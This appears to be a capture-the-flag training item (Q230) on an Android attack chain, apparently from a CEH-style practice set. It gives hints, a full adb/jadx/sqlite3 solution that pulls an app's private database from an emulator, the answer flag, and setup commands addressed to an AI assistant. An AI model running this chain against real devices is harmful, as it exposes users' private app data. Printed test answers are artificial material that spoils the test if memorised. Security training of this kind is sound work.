# Q230 — Multi-Step Android Attack Chain

| Field | Value |
|-------|-------|
| **Target** | Android emulator |
| **Domain** | Mobile Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `adb, apktool, jadx, sqlite3` |
| **Time budget** | 15–25 min |

---

## 📝 Question

"Complete attack chain: (1) Connect to Android via ADB, (2) Pull the installed APK, (3) Decompile it, (4) Find the database name in source code, (5) Pull the database, (6) Extract the flag from the database."

---

## 🎯 Flag Format

```
flag=<string>
```

---

## 💡 Hints

**Hint 1**

Step by step: `adb connect` → `adb shell pm path` → `adb pull` → `apktool d` → grep for DB name → `adb pull` DB → `sqlite3`

**Hint 2**

Database usually in `/data/data/<package>/databases/`

---

## ✅ Solution

```bash
# Step 1: Connect
adb connect 192.168.52.131:5555
# Step 2: Find and pull APK
adb shell pm path com.ceh.target
adb pull /data/app/com.ceh.target/base.apk
# Step 3: Decompile
jadx -d source/ base.apk
# Step 4: Find DB name
grep -rn "openOrCreateDatabase\|SQLiteDatabase" source/sources/
# Step 5: Pull database
adb root
adb pull /data/data/com.ceh.target/databases/secrets.db
# Step 6: Extract flag
sqlite3 secrets.db "SELECT * FROM flags;"
```

**Answer:** `flag=ANDROID_CHAIN_COMPLETE`

---

## 🤖 Claude Setup Prompt

1. Set up Android emulator with target app installed.
2. App should have SQLite DB with flags table.
```bash
adb shell "mkdir -p /data/data/com.ceh.target/databases/"
adb shell "sqlite3 /data/data/com.ceh.target/databases/secrets.db 'CREATE TABLE flags(id INTEGER, value TEXT); INSERT INTO flags VALUES(1, \"ANDROID_CHAIN_COMPLETE\");'"
```

Report back: "Lab ready for Q230 — Android attack chain environment ready"
